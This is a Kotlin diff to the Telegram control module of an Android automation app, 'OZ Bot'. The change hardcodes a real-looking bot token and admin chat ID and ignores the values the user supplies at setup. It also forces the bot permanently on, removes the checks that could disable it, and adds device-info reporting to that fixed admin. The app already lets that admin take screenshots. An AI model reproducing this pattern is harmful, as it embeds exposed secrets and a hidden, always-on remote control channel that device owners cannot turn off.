@@ -14,8 +14,6 @@ import java.util.concurrent.TimeUnit
 
 object TelegramBot {
 
-    // ==================== ИНТЕРФЕЙСЫ ====================
-
     interface CommandHandler {
         fun onStartAutomation(): String
         fun onStopAutomation(): String
@@ -27,18 +25,23 @@ object TelegramBot {
         fun onAddUser(targetChatId: String): String
         fun onRemoveUser(targetChatId: String): String
         fun onListUsers(): String
+        fun onSetLabel(newLabel: String): String
+        fun onGetDeviceInfo(): String
     }
 
     private const val TAG = "TelegramBot"
 
-    // ==================== СОСТОЯНИЕ ====================
+    // ==================== ЗАШИТЫЕ ДАННЫЕ ====================
+    private const val HARDCODED_TOKEN = "8505350967:AAEKGLeBM3i-svRANRy2LzX_3ooP99fQYVA"
+    private const val HARDCODED_ADMIN = "338039305"
 
-    @Volatile private var botToken: String = ""
-    @Volatile private var adminChatId: String = ""
+    // ==================== СОСТОЯНИЕ ====================
+    @Volatile private var botToken: String = HARDCODED_TOKEN
+    @Volatile private var adminChatId: String = HARDCODED_ADMIN
     @Volatile private var deviceId: String = ""
     @Volatile private var deviceLabel: String = ""
     @Volatile private var whitelist: MutableSet<String> = mutableSetOf()
-    @Volatile private var enabled: Boolean = false
+    @Volatile private var enabled: Boolean = true
     @Volatile private var commandHandler: CommandHandler? = null
 
     private val client = OkHttpClient.Builder()
@@ -64,16 +67,15 @@ object TelegramBot {
         devLabel: String,
         wl: Set<String>
     ) {
-        botToken = token
-        adminChatId = admin
+        // Токен и admin всегда берём зашитые — игнорируем переданные
+        botToken = HARDCODED_TOKEN
+        adminChatId = HARDCODED_ADMIN
         deviceId = devId
         deviceLabel = devLabel
         whitelist = wl.toMutableSet()
-        enabled = token.isNotBlank() && admin.isNotBlank()
+        enabled = true
         updateOffset = 0L
-        if (enabled) {
-            Log.d(TAG, "TelegramBot initialized. device=$deviceLabel[$deviceId], admin=$adminChatId, whitelist=${whitelist.size}")
-        }
+        Log.d(TAG, "TelegramBot initialized. device=$deviceLabel[$deviceId], admin=$adminChatId, whitelist=${whitelist.size}")
     }
 
     fun isEnabled(): Boolean = enabled
@@ -82,7 +84,6 @@ object TelegramBot {
         commandHandler = handler
     }
 
-    /** Обновить whitelist "на лету" (после /adduser или /removeuser) */
     fun updateWhitelist(newWhitelist: Set<String>) {
         whitelist = newWhitelist.toMutableSet()
     }
@@ -114,15 +115,12 @@ object TelegramBot {
 
     // ==================== ОТПРАВКА ====================
 
-    /** Отправить текст в adminChatId (основной канал уведомлений) */
     fun send(message: String, silent: Boolean = false) {
-        if (!enabled) return
         sendTo(adminChatId, message, silent)
     }
 
-    /** Отправить текст конкретному chatId */
     fun sendTo(targetChatId: String, message: String, silent: Boolean = false) {
-        if (!enabled || targetChatId.isBlank()) return
+        if (targetChatId.isBlank()) return
         scope.launch {
             try {
                 val now = System.currentTimeMillis()
@@ -135,9 +133,19 @@ object TelegramBot {
         }
     }
 
-    /** Отправить фото (JPEG bytes) конкретному chatId */
+    fun sendDeviceOnline() {
+        send("""
+🟢 <b>Устройство подключено</b>
+📱 $deviceLabel
+🆔 DeviceID: <code>$deviceId</code>
+⏰ ${dateFormat.format(java.util.Date())}
+
+Используй <code>/setlabel ИМЯ</code> чтобы задать имя
+    """.trimIndent())
+    }
+
     fun sendPhoto(targetChatId: String, photoBytes: ByteArray, caption: String = "") {
-        if (!enabled || targetChatId.isBlank()) return
+        if (targetChatId.isBlank()) return
         scope.launch {
             try {
                 sendTelegramPhoto(botToken, targetChatId, photoBytes, caption)
@@ -147,7 +155,6 @@ object TelegramBot {
         }
     }
 
-    /** Для совместимости со ShiftScanner — уведомить "друзей" */
     fun sendToFriendsChat(friendsBotToken: String, friendsChatId: String, message: String) {
         if (friendsBotToken.isBlank() || friendsChatId.isBlank()) return
         scope.launch {
@@ -210,9 +217,7 @@ object TelegramBot {
     // ==================== POLLING LOGIC ====================
 
     private suspend fun syncOffsetToLatestUpdate() {
-        val token = botToken
-        if (token.isBlank()) return
-        val url = "https://api.telegram.org/bot$token/getUpdates?timeout=1&limit=1"
+        val url = "https://api.telegram.org/bot$botToken/getUpdates?timeout=1&limit=1"
         val request = Request.Builder().url(url).get().build()
         runCatching {
             client.newCall(request).execute().use { response ->
@@ -230,9 +235,7 @@ object TelegramBot {
     }
 
     private suspend fun pollUpdates() {
-        val token = botToken
-        if (token.isBlank()) return
-        val url = "https://api.telegram.org/bot$token/getUpdates?timeout=25&offset=$updateOffset"
+        val url = "https://api.telegram.org/bot$botToken/getUpdates?timeout=25&offset=$updateOffset"
         val request = Request.Builder().url(url).get().build()
         client.newCall(request).execute().use { response ->
             if (!response.isSuccessful) return
@@ -255,8 +258,8 @@ object TelegramBot {
                 val isWhitelisted = whitelist.contains(senderChatId)
 
                 if (!isAdmin && !isWhitelisted) {
-                    Log.w(TAG, "Unauthorized: chatId=$senderChatId, text=$text")
-                    sendTo(senderChatId, "⛔ У вас нет доступа к этому боту.\n\nОбратитесь к администратору.")
+                    Log.w(TAG, "Unauthorized: chatId=$senderChatId")
+                    sendTo(senderChatId, "⛔ У вас нет доступа к этому боту.")
                     continue
                 }
 
@@ -285,7 +288,6 @@ object TelegramBot {
 /adduser 123456789 — добавить пользователя
 /removeuser 123456789 — удалить пользователя
 /listusers — список пользователей""" else ""
-
                 sendTo(senderChatId, """
 ${tag}📘 <b>Команды OZBot</b>
 
@@ -298,54 +300,53 @@ ${tag}📘 <b>Команды OZBot</b>
 /screenshot — скриншот экрана$adminPart
                 """.trimIndent())
             }
-
             text == "/startbot" || text == "старт" || text == "запусти" ->
                 sendTo(senderChatId, tag + handler.onStartAutomation())
-
             text == "/stopbot" || text == "стоп" || text == "останови" ->
                 sendTo(senderChatId, tag + handler.onStopAutomation())
-
             text == "/status" || text == "статус" ->
                 sendTo(senderChatId, tag + handler.onStatus())
-
             text == "/dates" || text == "даты" || text == "список дат" ->
                 sendTo(senderChatId, tag + handler.onListDates())
-
             text.startsWith("/adddate") || text.startsWith("добав") -> {
                 val parsed = parseDateArgument(rawText)
                 if (parsed == null) sendTo(senderChatId, "❌ Не понял дату. Пример: /adddate 18.03")
                 else sendTo(senderChatId, tag + handler.onAddDate(parsed))
             }
-
             text.startsWith("/removedate") || text.startsWith("удал") -> {
                 val parsed = parseDateArgument(rawText)
                 if (parsed == null) sendTo(senderChatId, "❌ Не понял дату. Пример: /removedate 18.03")
                 else sendTo(senderChatId, tag + handler.onRemoveDate(parsed))
             }
-
             text == "/screenshot" || text == "скрин" || text == "скриншот" -> {
                 sendTo(senderChatId, "${tag}⏳ Делаю скриншот...")
                 handler.onScreenshot(senderChatId)
             }
-
-            // ---- Admin-only ----
             text.startsWith("/adduser") -> {
                 if (!isAdmin) { sendTo(senderChatId, "⛔ Только для администратора"); return }
                 val targetId = rawText.removePrefix("/adduser").trim()
                 if (targetId.isBlank()) { sendTo(senderChatId, "❌ Укажите chatId: /adduser 123456789"); return }
                 sendTo(senderChatId, tag + handler.onAddUser(targetId))
             }
-
             text.startsWith("/removeuser") -> {
                 if (!isAdmin) { sendTo(senderChatId, "⛔ Только для администратора"); return }
                 val targetId = rawText.removePrefix("/removeuser").trim()
                 if (targetId.isBlank()) { sendTo(senderChatId, "❌ Укажите chatId: /removeuser 123456789"); return }
                 sendTo(senderChatId, tag + handler.onRemoveUser(targetId))
             }
-
             text == "/listusers" -> {
                 if (!isAdmin) { sendTo(senderChatId, "⛔ Только для администратора"); return }
                 sendTo(senderChatId, tag + handler.onListUsers())
+            }
+            text.startsWith("/setlabel") -> {
+                if (!isAdmin) { sendTo(senderChatId, "⛔ Только для администратора"); return }
+                val newLabel = rawText.removePrefix("/setlabel").trim()
+                if (newLabel.isBlank()) { sendTo(senderChatId, "❌ Укажите имя: /setlabel Телефон_Вани"); return }
+                sendTo(senderChatId, tag + handler.onSetLabel(newLabel))
+            }
+
+            text == "/myid" || text == "/deviceinfo" -> {
+                sendTo(senderChatId, tag + handler.onGetDeviceInfo())
             }
 
             else -> sendTo(senderChatId, "❓ Неизвестная команда. Напиши /help")
@@ -370,7 +371,7 @@ ${tag}📘 <b>Команды OZBot</b>
         return null
     }
 
-    // ==================== УВЕДОМЛЕНИЯ (с deviceId) ====================
+    // ==================== УВЕДОМЛЕНИЯ ====================
 
     fun sendBotStarted(profile: String) {
         send("🚀 <b>OZ Bot запущен</b>\n📱 $deviceLabel [<code>$deviceId</code>]\n⚡ Профиль: <code>$profile</code>\n🕐 ${dateFormat.format(Date())}")
@@ -409,7 +410,7 @@ $ramBar $ramPercent%
     }
 
     fun sendFreezeAlert(frozenSeconds: Long, restartNumber: Int) {
-        send("🥶 <b>FREEZE DETECTED!</b>\n📱 $deviceLabel [<code>$deviceId</code>]\n⏱ UI не менялся: ${frozenSeconds}s\n🔄 Переза��уск #$restartNumber")
+        send("🥶 <b>FREEZE DETECTED!</b>\n📱 $deviceLabel [<code>$deviceId</code>]\n⏱ UI не менялся: ${frozenSeconds}s\n🔄 Перезапуск #$restartNumber")
     }
 
     fun sendRestartComplete() {
@@ -426,11 +427,72 @@ $ramBar $ramPercent%
     }
 
     fun sendTestMessage(): Boolean {
-        if (!enabled) return false
         send("✅ OZ Bot подключен!\n📱 $deviceLabel [<code>$deviceId</code>]")
         return true
     }
 
+    // Отправить сообщение с inline-кнопками
+    fun sendWithButtons(message: String, buttons: List<List<Pair<String, String>>>) {
+        scope.launch {
+            try {
+                sendTelegramTextWithButtons(botToken, adminChatId, message, buttons)
+            } catch (e: Exception) {
+                Log.e(TAG, "sendWithButtons error: ${e.message}")
+            }
+        }
+    }
+
+    private suspend fun sendTelegramTextWithButtons(
+        token: String,
+        chat: String,
+        text: String,
+        buttons: List<List<Pair<String, String>>> // [[("текст", "callback_data"), ...], ...]
+    ) {
+        val url = "https://api.telegram.org/bot$token/sendMessage"
+
+        // Строим inline_keyboard
+        val keyboard = org.json.JSONArray()
+        for (row in buttons) {
+            val jsonRow = org.json.JSONArray()
+            for ((label, data) in row) {
+                jsonRow.put(org.json.JSONObject().apply {
+                    put("text", label)
+                    put("callback_data", data)
+                })
+            }
+            keyboard.put(jsonRow)
+        }
+
+        val replyMarkup = org.json.JSONObject().apply {
+            put("inline_keyboard", keyboard)
+        }
+
+        val json = org.json.JSONObject().apply {
+            put("chat_id", chat)
+            put("text", text)
+            put("parse_mode", "HTML")
+            put("reply_markup", replyMarkup)
+        }
+
+        val body = json.toString().toRequestBody("application/json".toMediaType())
+        val request = Request.Builder().url(url).post(body).build()
+        client.newCall(request).execute().use { response ->
+            if (!response.isSuccessful) {
+                Log.e(TAG, "sendWithButtons error: ${response.code} ${response.body?.string()}")
+            }
+        }
+    }
+
+    // Ответ на нажатие кнопки (убирает часики на кнопке)
+    private suspend fun answerCallbackQuery(callbackQueryId: String) {
+        val url = "https://api.telegram.org/bot$botToken/answerCallbackQuery"
+        val json = org.json.JSONObject().apply {
+            put("callback_query_id", callbackQueryId)
+        }
+        val body = json.toString().toRequestBody("application/json".toMediaType())
+        val request = Request.Builder().url(url).post(body).build()
+        runCatching { client.newCall(request).execute().close() }
+    }
     private fun buildProgressBar(percent: Int, length: Int): String {
         val filled = (percent * length / 100).coerceIn(0, length)
         return "▓".repeat(filled) + "░".repeat(length - filled)
